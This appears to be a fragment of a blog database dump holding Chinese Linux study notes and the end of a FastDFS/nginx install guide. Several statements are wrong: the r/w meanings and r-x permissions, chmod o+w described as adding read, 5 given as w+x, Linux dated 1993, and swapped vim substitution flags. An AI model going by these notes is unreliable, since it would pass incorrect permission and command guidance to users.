libfastcommon-1.0.42/\n<span class=\"hljs-comment\"># 编译安装</span>\n./make.sh &amp;&amp; ./make.sh install\n</code></div></pre>\n<h3><a id=\"FastDFS_34\"></a>安装FastDFS</h3>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-built_in\">cd</span> fastdfs-6.04/\n<span class=\"hljs-comment\"># 编译安装</span>\n./make.sh &amp;&amp; ./make.sh install\n<span class=\"hljs-comment\"># 将conf目录下所有配置文复制(移动)到/etc/fdfs/</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 修改tracker.conf配置文件</span>\n<span class=\"hljs-comment\">#####################################</span>\n<span class=\"hljs-comment\"># 存储日志和数据的根目录</span>\nbase_path =/usr/local/fastdfs/tracker\n<span class=\"hljs-comment\">#####################################</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 启动tracker服务</span>\n/usr/bin/fdfs_trackerd /etc/fdfs/tracker.conf\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 修改storage.conf配置文件</span>\n<span class=\"hljs-comment\">#####################################</span>\ngroup_name=upload\n<span class=\"hljs-comment\"># 存储日志和数据的根目录</span>\nbase_path=/usr/local/fastdfs/storage\nstore_path0=/usr/local/fastdfs/storage\ntracker_server=192.168.0.105:22122\n<span class=\"hljs-comment\"># http访问文件的端口 和nginx端口号保持一致</span>\nhttp.server_port=8888\n<span class=\"hljs-comment\">#####################################</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 启动storage服务</span>\n/usr/bin/fdfs_storaged /etc/fdfs/storage.conf\n</code></div></pre>\n<h2><a id=\"fastdfsnginxmodule_74\"></a>安装fastdfs-nginx-module</h2>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-built_in\">cp</span> /usr/local/dfs/fastdfs-nginx-module-1.22/src/mod_fastdfs.conf /etc/fdfs\n</code></div></pre>\n<h2><a id=\"nginx_80\"></a>nginx</h2>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 添加fastdfs-nginx-module模块</span>\n./configure --add-module=/usr/local/dfs/fastdfs-nginx-module-1.22/src/\n<span class=\"hljs-comment\"># 编译安装</span>\nmake &amp;&amp; make install\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 修改mod_fastdfs.conf配置文件</span>\n<span class=\"hljs-comment\">#####################################</span>\n<span class=\"hljs-comment\"># the base path to store log files</span>\nbase_path=/usr/local/fastdfs/storage/tmp\ntracker_server=192.168.0.105:22122\n<span class=\"hljs-comment\"># the group name of the local storage server</span>\ngroup_name=upload\n<span class=\"hljs-comment\"># url 是否包含组名(upload)</span>\nurl_have_group_name = <span class=\"hljs-literal\">true</span>\n<span class=\"hljs-comment\"># the paths must be exist</span>\n<span class=\"hljs-comment\"># must same as storage.conf</span>\nstore_path0=/usr/local/fastdfs/storage\n<span class=\"hljs-comment\">#####################################</span>\n</code></div></pre>\n<h2><a id=\"nginx_105\"></a>配置nginx访问</h2>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">server {\n    listen       8888;    <span class=\"hljs-comment\">## 该端口为storage.conf中的http.server_port相同</span>\n    server_name  localhost;\n    location upload/M00 {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n</code></div></pre>\n',5,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJb4OAHSnVAAAQ6GF1LMQ991.png',2,0,'220226DP09K1F0SW','FastDFS 安装教程 centos 7.x libfastcommon FastDFS分离出的一些公用函数包 FastDFS FastDFS本体 fastdfs-nginx-module FastDFS和nginx的关联模块 nginx nginx1.15.4 #编译环境 yuminstallgitgccgcc-c++makeautomakeautoconflibtoolpcrepcre-de',0,0,0,NULL,0,0,'2022-04-07 09:57:41','2022-05-07 13:59:14','[\"220329D4N9GNBDKP\"]',0),('220403CT2P7T6RP0','Linux','<h1><a id=\"Linux_0\"></a>Linux</h1>\n<p>[TOC]</p>\n<h2><a id=\"UNIX_4\"></a>UNIX发展史</h2>\n<ul>\n<li>1969年 美国贝尔实验室的肯.汤姆森(Ken Thompson)在PDP-机器上开发出了UNIX系统</li>\n<li>1971年 Dennis M.Ritchie(丹尼斯.里奇)发明了C语言 与ken Thompson一起开发UNIX系统</li>\n<li>1973年 UNIX大部分的源码用C语言重写,因此提高了UNIX系统的可移植性</li>\n</ul>\n<h2><a id=\"Linux_10\"></a>Linux发展史</h2>\n<p>Linux系统诞生于1993年,由芬兰大学生李纳斯(Linus Torvalds)和后来陆续加入的众多的爱好者共同开发完成。<br />\nLinux是开源软件,源代码开放的UnIX</p>\n<h2><a id=\"LAMP_15\"></a>支撑互联网的开源技术(LAMP)</h2>\n<ul>\n<li>LINUX  操作系统</li>\n<li>Apache Web操作系统</li>\n<li>MySQL  数据库</li>\n<li>PHP    编程语言</li>\n</ul>\n<hr />\n<h2><a id=\"nano_24\"></a>nano编辑器</h2>\n<h2><a id=\"vi_vim_26\"></a>vi 和vim模式的切换</h2>\n<p>命令行下输入  <code>vim</code>  文件名     进入一般模式(正常模式) 可以创建新文件也可以修改已有文件</p>\n<p>正常模式下输入i或者a或者o进入编辑模式 退出编辑模式使用<code>ESC</code></p>\n<p>正常模式下输入<code>:</code>或<code>/</code>进入命令行模式 ,退出命令行模式使用<code>ESC</code></p>\n<h3><a id=\"_34\"></a>插入</h3>\n<p><code>:set numer/nu</code>  设置行号</p>\n<p><code>:set nonu</code> 取消行号</p>\n<p><code>a</code> 在光标所在字符后插入</p>\n<p><code>A</code> 在光标所在行尾插入</p>\n<p><code>i</code> 在光标所在字符前插入</p>\n<p><code>I</code> 在光标所在行首插入</p>\n<p><code>o</code> 在光标下插入新行</p>\n<p><code>O</code> 在光标上插入新行</p>\n<p><code>gg</code>到文件的第一行</p>\n<p><code>G</code>到文件的最后一行</p>\n<p><code>nG</code> 到文件的第n行</p>\n<p><code>:n</code> 到文件的第n行</p>\n<p><code>0</code> 移动到行首</p>\n<p><code>$</code>移动到行尾</p>\n<hr />\n<h3><a id=\"_66\"></a>删除</h3>\n<p><code>x</code> 删除光标所在处的字符</p>\n<p><code>nx</code> 删除光标所在处后的n个字符</p>\n<p><code>dd</code>删除光标所在行</p>\n<p><code>ndd</code>删除n行</p>\n<p><code>dG</code>删除光标到行尾的所有的内容</p>\n<p><code>D</code>删除光标所在处到该行行尾所在行的所有内容</p>\n<p><code>:n1,n2d</code>删除n1到n2的行所有内容</p>\n<hr />\n<h3><a id=\"_84\"></a>复制粘贴</h3>\n<p><code>yy</code> 复制当前行的内容</p>\n<p><code>nyy</code> 复制当前以下的n行</p>\n<p><code>dd</code> 剪切当前行</p>\n<p><code>ndd</code> 剪切当前以下的n行</p>\n<p><code>p</code> 粘贴在当前光标的下一行</p>\n<p><em><strong>P</strong></em>:粘贴在当前光标的上一行</p>\n<hr />\n<h3><a id=\"_100\"></a>保存</h3>\n<p>在命令行模式下 <code>:wq</code>  保存当前内容并且退出      <code>:q!</code>     不保存当前内容且强制退出  <code>:q</code> 是不做任何修改时,退出。若做了修改,需要使用<code>:q!</code> 才可以强制退出</p>\n<p><code>ZZ</code>相当于<code>:wq</code> 保存修改并退出</p>\n<p><code>:w</code> 保存修改不退出</p>\n<p><code>:w 指定的目录文件</code> 另存为指定文件</p>\n<p><code>:wq!</code> 文件的所有者以及root可以使用</p>\n<p>(带有:的是在命令行模式下,其他都在正常模式下进行,都需要退出插入模式)</p>\n<h3><a id=\"_114\"></a>替换</h3>\n<p><code>R </code> 从光标开始处开始进行字符替换,esc结束</p>\n<p><code>u</code> 取消上一次操作</p>\n<p><code>/string</code> 搜索指定的字符串   <code>:set ic</code>  搜索时忽略大小写  <code>n</code> 搜索结果向下翻</p>\n<p><code>%s/替换的目标/替换的值/g</code>   全文替换指定的字符串   <code>g</code> 询问提示  <code>c</code> 不询问提示</p>\n<p><code>8,16s/替换目标/替换的值/g</code>    在8到16行内替换指定的字符串</p>\n<h3><a id=\"vim_126\"></a>为vim定义快捷键</h3>\n<p><code>:map Ctrl V Ctrl P I#&lt;ESC&gt; </code>      <em><strong>Ctrl P</strong></em> 为光标所在行加上注释并退出</p>\n<p><code>:map Ctrl V Ctrl B  0x</code>           <em><strong>Ctrl B</strong></em>      去掉本行的注释</p>\n<h3><a id=\"_132\"></a>导入命令</h3>\n<p><code>:r 文件目录</code>                将文件的内容导入此vim编辑器中</p>\n<p><code>:r !命令</code>                     将命令的结果导入vim编辑器中</p>\n<hr />\n<h2><a id=\"_140\"></a>关机重启</h2>\n<p><code>shutdown -h now</code> 立即关机</p>\n<p><code>halt</code> 立即关机</p>\n<p><code>shutdown -h 1</code> 一分钟后关机</p>\n<p><code>reboot</code>  立即重启</p>\n<p><code>shutdown -r now</code> 立即重启</p>\n<h2><a id=\"_152\"></a>用户管理</h2>\n<p>创建用户:  <code>useradd 用户名</code>    (此时默认的分组名是用户名)</p>\n<p>设定密码  : <code>passwd 用户名 </code></p>\n<p>指定组名 : <code>useradd -d 组名 用户名</code></p>\n<p><code>who</code> : 查看用户登陆信息</p>\n<p><img src=\"https://cdn.qingweico.cn/blog/5ef2e89f14195aa594bff21f.png\" alt=\"1588911447007\" /></p>\n<p>第一个root 代表服务器启动时root登陆</p>\n<p>第二个root代表远程登陆(XShell)</p>\n<p>第三个root代表服务器启用终端登陆</p>\n<p>:0代表本地登陆</p>\n<p>pts代表远程登陆 使用不同的数字区分不同的远程终端</p>\n<p><code>w</code> :查看用户登陆的详细信息</p>\n<p><img src=\"https://cdn.qingweico.cn/blog/5ef2e89f14195aa594bff221.png\" alt=\"1588911970296\" /></p>\n<p><code>uptime</code> 查看用户登陆一些基本信息</p>\n<h3><a id=\"_180\"></a>删除用户</h3>\n<p><code>userdel 用户名</code></p>\n<h3><a id=\"_184\"></a>查询用户信息</h3>\n<p><code>id 用户名</code></p>\n<h3><a id=\"_188\"></a>切换用户</h3>\n<p><code>su - 用户名</code></p>\n<p>高权限用户向普通用户切换时不需要密码 反之则需要</p>\n<p><code>exit</code> 返回之前用户</p>\n<h3><a id=\"_196\"></a>创建组</h3>\n<p><code>groupadd  组名</code></p>\n<p><code>useradd - g 组名 用户名</code> :将用户分配到指定的组中</p>\n<p><code>-d</code> 和<code>-g</code>给用户分配组名的区别: 前者给用户创建一个之前不存在的组名,后者给用户分配已经创建完成的组</p>\n<h3><a id=\"_204\"></a>删除组</h3>\n<p><code>groupdel 组名 </code></p>\n<h3><a id=\"_208\"></a>更换用户所在组</h3>\n<p><code>usermod -g :新的组名 用户</code></p>\n<h3><a id=\"_212\"></a>用户和组的相关的文件</h3>\n<p><code>/etc/passwd</code> : 用户的配置文件 记录用户的各种信息</p>\n<p><code>/etc/shadow</code> : 口令的配置文件</p>\n<p><code>/etx/group</code> : 组的配置文件 记录linux包含组的信息</p>\n<h2><a id=\"Linux_220\"></a>Linux运行级别</h2>\n<ul>\n<li>0 系统停机状态  系统默认运行级别不能设置为0,否则不能正常启动</li>\n<li>1 单用户工作状态,root权限,同于系统维护,禁止远程登陆</li>\n<li>2 多用户状态(没有NFS),不支持网络</li>\n<li>3 完全的多用户状态(有NFS),登陆后进入控制台命令模式</li>\n<li>4 系统未使用,保留</li>\n<li>5 Xll控制台,登陆后进入图形GUI模式</li>\n<li>6 系统正常关闭并重启。默认级别不能设为6,否则不能正常启动</li>\n</ul>\n<p><code>runlevel</code> :查看当前运行级别</p>\n<h2><a id=\"_232\"></a>帮助指令</h2>\n<p><code>man [指令] /配置文件 </code>  查看命令或者配置文件的帮助信息,当查看配置文件时不用加配置文件的绝对路径 ,直接加配置文件名即可</p>\n<p><code>whatis 命令 </code>   查询命令的简单介绍</p>\n<p><code>apropos 配置文件</code>  查询配置文件信息</p>\n<p><code>命令 --help</code> 获取命令的主要的信息</p>\n<p><code>info 命令</code> 和man差不多</p>\n<p><code>help 命令</code> 查看linux内置的命令</p>\n<h2><a id=\"_246\"></a>实用指令</h2>\n<p><code>usr</code> : unix system resource</p>\n<p><code>var</code> : Variable Data File 存储运行时数据</p>\n<p><code>dev</code> : echo “…” &gt; /dev/null 可以向其中写入任何东西(好比垃圾桶)</p>\n<h3><a id=\"_254\"></a>文件目录类</h3>\n<p><code>pwd</code>:  显示当前工作目录的绝对路径</p>\n<p><code>ls [选项] 【文件或目录】</code></p>\n<p>选项包括 <code>a</code>, <code>l</code></p>\n<p><code>ls -l</code> : 表示以列表的形式显示当前目录下所有的文件</p>\n<p><code>ls -a</code> 表示显示当前目录下所有的文件包括隐藏的文件或文件夹</p>\n<p><code>ls -d</code> 显示当前目录的信息</p>\n<p><code>ls -F</code> 查看文件的类型</p>\n<h4><a id=\"_270\"></a>创建目录和删除</h4>\n<p><code>mkdir 目录名     </code>     创建一层目录</p>\n<p><code>mkdir -p 目录名</code> 创建多级目录</p>\n<p><code>rmdir 目录名</code>  删除空的目录</p>\n<p><code>rm -rf 目录名 </code> 删除不为空的目录</p>\n<h4><a id=\"_280\"></a>创建空的文件</h4>\n<p>man touch:  touch - change file timestamps</p>\n<p>确实tocuh的作用是改变文件的时间戳 如果没有则创建文件</p>\n<p><code>touch 文件名</code></p>\n<h4><a id=\"_288\"></a>复制文件</h4>\n<p><code>scp file_source file_target</code> 用于Linux之间复制文件和目录</p>\n<p>eg: <code>scp local_file remote_username@remote_ip:remote_folder </code> 从本地复制到远程</p>\n<p><code>cp resource target</code>   将resource复制到目标目录下</p>\n<p><code>cp -r resouce taget</code> 使用递归将文件夹下所以的文件全部复制到目标目录下</p>\n<p><code>\\cp -r resouce taget</code> 强制覆盖以存在的文件</p>\n<p><code>cp -p</code> 保存文件的原有属性</p>\n<h4><a id=\"_302\"></a>删除文件</h4>\n<p><code>rm 【选项】文件名或目录名</code></p>\n<p>选项 :<code>-r</code> 删除整个目录   <code>-f</code> 强制删除没有提示信息</p>\n<p><code>mv</code> 重命名文件或者移动文件</p>\n<p>当在同一个目录下移动文件就是重命名  <code>mv oldFileName newFileName</code></p>\n<p>当前后目录不同时就是移动文件夹  <code>mv oldFileName /root/</code>;将oldFileName移动到root目录下</p>\n<h4><a id=\"_314\"></a>查看文件</h4>\n<p>cat用于连接文件并打印到标准输出设备上</p>\n<p>查看日志文件不要使用cat 如果日志文件过大会卡死 应该使用less命令</p>\n<p><code>cat 【选项】文件名 | more </code>  :只读的方式 | 分页的形式查看文件  选项为 <code>-n</code>: 可以显示行号</p>\n<p>more指令</p>\n<p><code>more 文件</code> :分页的形式查看文件</p>\n<p><code>enter</code> :一行一行看</p>\n<p><code>空格</code> 一页一页查看</p>\n<p><code>ctrl+B</code> : 查看上一页</p>\n<p><code>ctrl+f或f</code> 查看下一页</p>\n<p><code>q或Q</code> 立即离开文件内容</p>\n<p><code>=</code> 显示当前的行号</p>\n<p><code>:f</code> 显示文件名和当前的行号</p>\n<p>less指令</p>\n<p><code>less 文件</code>  方便查看大型文件 ,一次只加载一页</p>\n<p><code>enter</code> 一次查看一行</p>\n<p><code>空格</code> 一次查看一页</p>\n<p><code>上箭头</code> :向上翻页</p>\n<p><code>下箭头</code> 向下翻页</p>\n<p><code>q</code> 退出该文件</p>\n<p><code>/字符串</code> 向下查找字符串  <code>n </code> 向下查找 <code>N</code> 向上查找</p>\n<p><code>?字符 </code>串 向上查找字符 <code>n</code> 向上查找 <code>N</code> 向下查找</p>\n<h4><a id=\"_gt__gtgt__358\"></a><code> &gt;</code> 和 <code>&gt;&gt;</code> 指令</h4>\n<p><code>文件 &gt;</code> 文件  覆盖写     指令的意思是将左边的文件写入到右边的文件中 若右边的文件不存在则创建 存在则覆盖</p>\n<p><code>文件 &gt;&gt; 文件</code> 追加写</p>\n<p><code>ls -l &gt; 文件</code> 将当前目录下的文件列表写入到文件中</p>\n<p><code>cat 文件1 &gt; 文件2</code> 将文件1的内容覆盖写到文件2  (  &gt;&gt; 追加写入)</p>\n<p><code>echo &quot;内容&quot; &gt; 文件</code> 将内容覆盖写入文件中   ( &gt;&gt; 追加写入)</p>\n<h4><a id=\"echo_370\"></a>echo</h4>\n<p><code>echo  输入内容</code> : <code>echo $PATH</code> 输入环境变量</p>\n<p><code>echo hello</code> 向控制台输入hello</p>\n<h4><a id=\"headtail_376\"></a>head&amp;tail</h4>\n<p><code>head 文件 </code>             查看文件的前(默认)10行</p>\n<p><code>head -n N 文件</code>  查看文件的前N行</p>\n<p><code>tail 文件</code>            查看文件的后(默认)10行</p>\n<p><code>tail -n M 文件</code>  查看文件的后M行</p>\n<p><code>tail -f  文件</code>    实时追踪该文档的所有更新, 工作中很常用</p>\n<h4><a id=\"ln__388\"></a>ln指令 (软连接)</h4>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-built_in\">ln</span> -s /root linkToRoot  <span class=\"hljs-comment\"># 将linkToRoot链接到root目录下</span>\n<span class=\"hljs-built_in\">ln</span>  /root/hard  /root/hard/linkHard   <span class=\"hljs-comment\"># 硬连接  可以做到数据的同步更新且硬连接的inode和源文件相同,但是硬连接不能对目录使用且不可以跨分区</span>\n</code></div></pre>\n<p>当我们使用pwd查看绝对路径时仍然是当前路径</p>\n<p><code>rm - rm linkToRoot</code> 删除软链接</p>\n<h4><a id=\"alias_399\"></a>alias指令</h4>\n<p><code>alias</code> : 列出目前所有的别名</p>\n<p>给命令设置别名(服务器重启后该设置失效): alias croot=cd /root</p>\n<p>通过修改配置文件的方式(永久生效)</p>\n<pre><div class=\"hljs\"><code class=\"lang-shell\">vim ~/.bashrc\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-shell\"><span class=\"hljs-meta\"># </span><span class=\"language-bash\">.bashrc</span>\n<span class=\"hljs-meta\">\n# </span><span class=\"language-bash\">User specific aliases and <span class=\"hljs-built_in\">functions</span></span>\n\nalias rm=&#x27;rm -i&#x27;\nalias cp=&#x27;cp -i&#x27;\nalias mv=&#x27;mv -i&#x27;\nalias croot=&#x27;cd /root&#x27;\n<span class=\"hljs-meta\">\n# </span><span class=\"language-bash\">Source global definitions</span>\nif [ -f /etc/bashrc ]; then\n        . /etc/bashrc\nfi\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 让配置生效</span>\n<span class=\"hljs-built_in\">source</span> ~/.bashrc\n</code></div></pre>\n<h4><a id=\"history_432\"></a>history指令</h4>\n<p><code>history</code> 显示所有的历史命令</p>\n<p><code>history M</code> 显示前M个历史指令</p>\n<p><code>!N</code> 执行第N个历史指令</p>\n<h3><a id=\"_440\"></a>时间日期类</h3>\n<h4><a id=\"date_442\"></a>date指令</h4>\n<p><code>date</code> 显示当前的时间</p>\n<p><code>date&quot;+%Y-%m-%d %H:%M:%S&quot;</code> 格式化日期显示时间  (+号不可省略)</p>\n<p><code>date -s &quot;时间&quot;</code> 修改时间</p>\n<p><code>cal</code> 显示当前月份的日历</p>\n<p><code>cal 年份</code> 显示一年的日历</p>\n<p><code>timedatectl set-time 2018-01-03 23:00:00</code> 设置当前系统时间</p>\n<h3><a id=\"_456\"></a>搜寻查找类</h3>\n<p><code>find 【目录】 查找类型 文件名</code></p>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">find /home -name hello.txt  <span class=\"hljs-comment\"># 查找home目录下文件名为hello.txt的文件</span>\n* 匹配任何字符\n？匹配任意字符\n-iname 不区分大小写\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">find /home -user admin <span class=\"hljs-comment\"># 查找用户名为admin的文件</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">find / -size +20M  <span class=\"hljs-comment\"># 查找当前系统下大于20M的文件  -20M(小于20M的文件)   20M(等于20M的文件)  (M大写 k可以小写 不可以大写)</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">find /etc -cmin -5;<span class=\"hljs-comment\"># 在etc目录下查找5分钟内被修改过文件属性的文件和目录</span>\n-amin  访问时间  access\n-cmin 文件属性   change\n-mmin 文件内容   modify\n</code></div></pre>\n<p><code>-a</code> and   同时满足两个条件</p>\n<p><code>-o</code> or     两个条件满足其中一个即可</p>\n<p><code>-type 【选项】</code> 【选项】:<code>-f</code> 普通文件  <code>-d</code> 目录  <code>-l</code> 软连接</p>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">find /etc -size +20M -a -size -50M -<span class=\"hljs-built_in\">type</span> f          <span class=\"hljs-comment\"># 查找etc目录下文件大小在20M~50M之间的文件</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">find /etc -name *init* -<span class=\"hljs-built_in\">exec</span> 执行操作命令 {} \\;      <span class=\"hljs-comment\"># 对搜索结果进行操作(严格区分空格)</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">find /etc -name *init* -ok 执行操作命令 {} \\;        <span class=\"hljs-comment\"># 带有询问</span>\n</code></div></pre>\n<p><em><img src=\"https://cdn.qingweico.cn/blog/5ef2e89f14195aa594bff21d.png\" alt=\"1588829333905\" /></em></p>\n<p>找到test目录下java的文件且带有询问的删除</p>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">find . -inum inod号 -<span class=\"hljs-built_in\">exec</span> <span class=\"hljs-built_in\">rm</span> -rf {} \\; <span class=\"hljs-comment\"># 根据inode号来删除当前目录下的文件</span>\n</code></div></pre>\n<h4><a id=\"locate_508\"></a>locate</h4>\n<p><code>locate 文件</code> 用于快速定位文件 基于数据库查找    不用遍历整个文件系统</p>\n<p>刚创建的文件,需要使用命令<code>updatedb</code>更新数据库,才可以查找到该文件</p>\n<p>在/tmp中创建的文件不可以被locate找到</p>\n<h4><a id=\"grep_516\"></a>grep和管道符</h4>\n<p>管道是进程中通信的手段 也是一个文件</p>\n<p><code>mkfifo filename </code>创建一个管道文件</p>\n<p><code>ls / | tee file | wc -l</code></p>\n<p><code>grep</code> 过滤查找</p>\n<p><code>grep password filename</code> 在文件中过滤查找</p>\n<p><code>|</code>  将前一个命令查找的结果输出传递给后一个命令输入</p>\n<p><code>cat hello.txt| grep -n hello</code>  查找hello.txt文件 并且在该文件中查找hello并显示所在的行号</p>\n<p><code>-n </code> 显示行号</p>\n<p><code>-i</code> 忽略大小写</p>\n<p><code>-v 字符串</code> 排除指定的字符串  <code>^N</code>   以N开头的字符串</p>\n<h4><a id=\"whereis__which_538\"></a>whereis  which</h4>\n<p><code>which</code> 用来查看命令的文件路径以及是否有别名</p>\n<p><code>whereis</code> 用来查看命令所在的目录以及帮组文档的路径</p>\n<h4><a id=\"_544\"></a>高阶查找</h4>\n<p>xargs  配合管道符一块使用</p>\n<p>find 文件目录 -name “*.java” | xargs -I {} cat {} | wc -l 查看目录中以java结尾的文件中所有的行数</p>\n<h3><a id=\"_550\"></a>解压和压缩类</h3>\n<p><code>gzip 文件</code> : 压缩</p>\n<p><code>gunzip 文件.gz</code> 解压(不常用)  使用<code>gzip</code>命令压缩文件时不会保留源文件且不可以对目录压缩</p>\n<hr />\n<p><code>zip 【选项】文件 压缩目录</code>              压缩        选项可以为 <code>-r</code> 递归压缩整个目录 文件是压缩后的文件名</p>\n<p><code>unzip【选项】解压目录 文件</code>            解压        选项可以为<code>-d&lt;目录&gt;</code> 指定解压后存放的目录  文件是解压前的文件名</p>\n<hr />\n<p><code>tar </code>   打包的文件以.tar.gz结尾</p>\n<p><code>c</code> :产生.tar打包文件</p>\n<p><code>v</code> 显示详细信息</p>\n<p><code>f</code> 指定打包的文件名</p>\n<p><code>z</code> 打包同时压缩</p>\n<p><code>x</code> 解压.tar文件</p>\n<p><code>tar -zcvf 压缩后的文件名 目标文件名/目录</code>                                         压缩文件</p>\n<p><code>tar -zxvf 将要解压的文件 解压到的目录</code>                                               解压文件</p>\n<hr />\n<p><code>bzip2</code> zip的升级班 增加了可以保留源文件的选项</p>\n<p><code>bzip2 -k  源文件</code>  压缩文件并保留源文件</p>\n<p><code>bunzip2 -k 压缩文件</code>  解压文件且保留压缩包</p>\n<hr />\n<p><code>tar -cjf 压缩后的文件名 源文件</code>  生成.tar.bz2的压缩文件</p>\n<p><code>tar -xjf</code> 解压以.tar.bz2结尾的压缩文件</p>\n<p><code>tar -tvf backup.tar </code> 查看tar文件的内容而不提取</p>\n<p><code>tar -zxvf backup.tar -C /usr/local</code> 解压到其他目录</p>\n<h3><a id=\"_598\"></a>排序类</h3>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># ip.txt,每行一条ip记录,共若干行,已排好序,统计出现次数最多的前3个ip及其次数</span>\n<span class=\"hljs-built_in\">uniq</span> -c ip.txt | <span class=\"hljs-built_in\">sort</span> -nr | <span class=\"hljs-built_in\">head</span> -n 3\n</code></div></pre>\n<h2><a id=\"Linux_605\"></a>Linux组管理</h2>\n<h3><a id=\"_607\"></a>查看文件的所有者</h3>\n<p><code>ls -ahl</code></p>\n<h3><a id=\"_611\"></a>修改文件的所有者</h3>\n<p><code>chown 用户名  文件名  </code>             改变单个文件的所有者</p>\n<p><code>chown -R 用户名 文件目录名</code>  改变目录下的所有文件或目录(递归) 的所有者</p>\n<h3><a id=\"_617\"></a>修改文件所在组</h3>\n<p><code>chgrp 新组名 文件名 </code>                     改变单个文件的所在组</p>\n<p><code>chgrp -R 新组名 文件目录名</code>       改变目录下所有文件索目录的所在组</p>\n<h3><a id=\"_623\"></a>改变用户所有组</h3>\n<p><code>usermod -g  新组名 用户名</code></p>\n<h3><a id=\"_627\"></a>查看缺省文件创建的权限</h3>\n<p><code>umask -S</code></p>\n<h3><a id=\"_631\"></a>权限</h3>\n<p><em><img src=\"https://cdn.qingweico.cn/blog/5ef2e89114195aa594bfed34.png\" alt=\"1588306848988\" /></em></p>\n<p><em><img src=\"https://cdn.qingweico.cn/blog/5ef2e89114195aa594bfed37.png\" alt=\"1588307060227\" /></em></p>\n<p>从左到右:</p>\n<ul>\n<li>\n<p><code>d</code>  代表文件类型是目录  <code>-</code> 代表普通的文件 <code>l</code>  代表软连接  <code>c</code>  字符设备【键盘,鼠标】  <code>b</code>  块文件 硬盘</p>\n</li>\n<li>\n<p><code>rwx</code>  表示文件所有者的权限  <code>r </code> 代表写的权限  <code>w</code> 代表读的权限  <code>x(execute)</code> 代表可执行的权限</p>\n</li>\n<li>\n<p><code>r-x</code> 代表与文件拥有者同一组的用户所拥有的权限  可以写和执行但不能读</p>\n</li>\n<li>\n<p><code>r-x</code> 代表不与文件拥有者同组的其他用户所拥有的权限 (以上3个一组  <code>-</code> 代表不具有该权限    <code>rwx</code> 可以用数字表示 <code>r</code> 等于4   <code>w</code>  等于2    <code>x</code>等于1)</p>\n</li>\n<li>\n<p>3或者1  如果是文件 数字代表硬连接数目 如果是目录则代表该目录下的子目录数(不包括文件 包括隐藏目录)</p>\n</li>\n<li>\n<p>root 代表文件的所有者</p>\n</li>\n<li>\n<p>root 代表文件所在的组名</p>\n</li>\n<li>\n<p>19    如果是文件 表示文件的大小(字节)   如果是目录</p>\n</li>\n<li>\n<p>时间代表最后一次修改的时间</p>\n</li>\n</ul>\n<h3><a id=\"rwx_650\"></a>rwx权限详解</h3>\n<p>rwx作用文件:</p>\n<ul>\n<li>r代表read 可以读取,查看</li>\n<li>w代表write 可以修改,但是不代表可以删除该文件,删除一个文件的前提是要有对该文件有写的权限,才可以删除该文件</li>\n<li>x代表可执行,可以被执行</li>\n</ul>\n<p>rwx作用目录</p>\n<ul>\n<li>r代表可读  ls可以查看目录内容</li>\n<li>write代表可写 代表可以修改  在目录内创建-删除-重命名目录</li>\n<li>x代表可以执行 可以进入该目录</li>\n</ul>\n<p><em><strong>删除一个目录下文件的关键不是该文件是否具有w(写)权限,而是该文件所在的目录是否具有w权限即对文件的创建,删除权限</strong></em></p>\n<h3><a id=\"_________666\"></a>修改权限 (通过 +  -  =  变更权限)</h3>\n<p><code>u </code> 代表所有者 <code>g</code> 代表所有组 <code>o</code>代表其他人  <code>a</code> 代表所有人(u+g+o)</p>\n<p><code>chmod u=rwx,g=rx,o=x  文件目录名</code>  将该文件的权限修改为 rwxr-x–x</p>\n<p><code>chmod o+w 文件目录名</code>  增加其他人对该文件读的权限</p>\n<p><code>chmod a-x </code> 移出所有人对该文件的执行权限</p>\n<p><code>chmod -R</code> 遍历修改目录下所有文件或者目录的权限</p>\n<h3><a id=\"__678\"></a>修改权限 (通过数字变更权限)</h3>\n<p><code>chmod  751  文件目录名</code>    7 = <code>r+w+x</code>  5  = <code>w+x</code>  1 = <code>x</code></p>\n<h2><a id=\"_682\"></a>任务调度</h2>\n<p>任务调度是指系统在某个时间执行特定的命令或者程序</p>\n<p><code>crontab -e</code> 编辑定时任务的</p>\n<p><code>crontab -l</code> 查询crontab的任务</p>\n<p><code>crontab -r</code> 删除当前用户下所有的crontab任务</p>\n<p><code>tail -f /var/log/cron</code> 查看定时任务的执行日志</p>\n<p><code>*/1 * * * * ls-l &gt;/tmp/to.txt</code>:    每小时的每分钟执行<code>ls-l &gt;/tmp/to.txt </code>命令</p>\n<h3><a 